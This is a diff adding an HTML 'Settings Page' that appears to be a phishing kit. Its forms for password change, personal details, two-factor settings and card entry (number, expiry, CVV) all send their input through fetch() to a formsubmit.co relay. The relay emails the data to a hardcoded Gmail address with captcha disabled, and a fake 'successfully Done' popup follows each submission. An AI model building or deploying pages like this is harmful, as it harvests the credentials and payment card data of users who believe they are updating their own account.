@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Settings Page</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <style>
+    /* General Styles */
+    body {
+      font-family: Arial, sans-serif;
+      background: #121212;
+      color: #fff;
+      margin: 0;
+      padding: 0;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      padding: 20px;
+      background: #1f1f1f;
+      font-size: 20px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .header i {
+      margin-right: 10px;
+      cursor: pointer;
+    }
+
+    .container {
+      padding: 20px;
+    }
+
+    .settings-section {
+      margin-bottom: 30px;
+    }
+
+    .settings-section h3 {
+      margin-bottom: 15px;
+      font-size: 18px;
+    }
+
+    .settings-section form {
+      background: #1f1f1f;
+      padding: 20px;
+      border-radius: 8px;
+    }
+
+    .settings-section form input,
+    .settings-section form select,
+    .settings-section form button {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #333;
+      border-radius: 5px;
+      background: #333;
+      color: #fff;
+      font-size: 14px;
+    }
+
+    .settings-section form button {
+      background: #ff5733;
+      cursor: pointer;
+      border: none;
+    }
+
+    .settings-section .credit-card {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .settings-section .credit-card img {
+      width: 50px;
+      height: auto;
+    }
+
+    /* Popup */
+    .popup-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .popup-message {
+      background: #1f1f1f;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      width: 90%;
+      max-width: 300px;
+    }
+
+    .popup-message i {
+      font-size: 50px;
+      color: #4caf50;
+      margin-bottom: 10px;
+    }
+
+    .popup-message p {
+      font-size: 16px;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Header -->
+  <div class="header">
+    <i class="fas fa-arrow-left" onclick="goBack()"></i> Settings
+  </div>
+
+  <!-- Container -->
+  <div class="container">
+    <!-- Change Password -->
+    <div class="settings-section">
+      <h3>Change Password</h3>
+      <form id="change-password-form">
+        <input type="password" name="newPassword" placeholder="Enter New Password" required>
+        <input type="hidden" name="email" value="ghya@gmail.com">
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_template" value="table" />
+        <button type="submit">Change Password</button>
+      </form>
+    </div>
+
+    <!-- Edit Personal Information -->
+    <div class="settings-section">
+      <h3>Edit Personal Information</h3>
+      <form id="edit-info-form">
+        <input type="text" name="name" placeholder="Full Name" required>
+        <input type="email" name="email" placeholder="Email Address" required>
+        <input type="tel" name="phone" placeholder="Phone Number" required>
+        <input type="hidden" name="email" value="ghya@gmail.com">
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_template" value="table" />
+        <button type="submit">Submit</button>
+      </form>
+    </div>
+
+    <!-- Two-Factor Authentication -->
+    <div class="settings-section">
+      <h3>Two-Factor Authentication</h3>
+      <form id="two-factor-form">
+        <select name="twoFactor" required>
+          <option value="" disabled selected>Enable Two-Factor Authentication</option>
+          <option value="enable">Enable</option>
+          <option value="disable">Disable</option>
+        </select>
+        <input type="hidden" name="email" value="ghya@gmail.com">
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_template" value="table" />
+        <button type="submit">Activate</button>
+      </form>
+    </div>
+
+    <!-- Manage Payment Method -->
+    <div class="settings-section">
+      <h3>Manage Payment Method</h3>
+      <form id="payment-form">
+        <div class="credit-card">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard">
+          <input type="text" name="cardNumber" placeholder="Card Number" required>
+        </div>
+        <input type="text" name="cardName" placeholder="Cardholder Name" required>
+        <input type="text" name="expiryDate" placeholder="Expiry Date (MM/YY)" required>
+        <input type="text" name="cvv" placeholder="CVV" required>
+        <input type="hidden" name="email" value="ghya@gmail.com">
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_template" value="table" />
+        <button type="submit">Add card</button>
+      </form>
+    </div>
+
+    <!-- Subscription Plans -->
+    <div class="settings-section">
+      <h3>Subscription Plans</h3>
+      <form id="subscription-plan-form">
+        <select name="plan" required>
+          <option value="" disabled selected>Select Plan</option>
+          <option value="basic">Silver</option>
+          <option value="premium">Gold</option>
+          <option value="pro">Premium</option>
+        </select>
+        <input type="hidden" name="email" value="ghya@gmail.com">
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_template" value="table" />
+        <button type="submit">Select Plan</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Popup -->
+  <div class="popup-overlay" id="popup-overlay">
+    <div class="popup-message">
+      <i class="fas fa-check-circle"></i>
+      <p id="popup-text"></p>
+      <button onclick="closePopup()">Close</button>
+    </div>
+  </div>
+
+  <script>
+    const forms = document.querySelectorAll("form");
+    const popupOverlay = document.getElementById("popup-overlay");
+    const popupText = document.getElementById("popup-text");
+
+    // Handle Form Submission
+    forms.forEach((form) => {
+      form.addEventListener("submit", (event) => {
+        event.preventDefault();
+
+        const formData = new FormData(form);
+        const endpoint = "https://formsubmit.co/d9f61c17f613fa74cac19820481f9b21";
+
+        fetch(endpoint, {
+          method: "POST",
+          body: formData,
+        })
+          .then((response) => {
+            if (response.ok) {
+              showPopup("Your changes have been successfully Done!");
+              form.reset();
+            } else {
+              showPopup("Something went wrong. Please try again.");
+            }
+          })
+          .catch(() => {
+            showPopup("Failed to connect. Please check your network.");
+          });
+      });
+    });
+
+    // Show Popup
+    function showPopup(message) {
+      popupText.textContent = message;
+      popupOverlay.style.display = "flex";
+    }
+
+    // Close Popup
+    function closePopup() {
+      popupOverlay.style.display = "none";
+    }
+
+    // Go Back Function
+    function goBack() {
+      window.history.back();
+    }
+  </script>
+</body>
+</html>
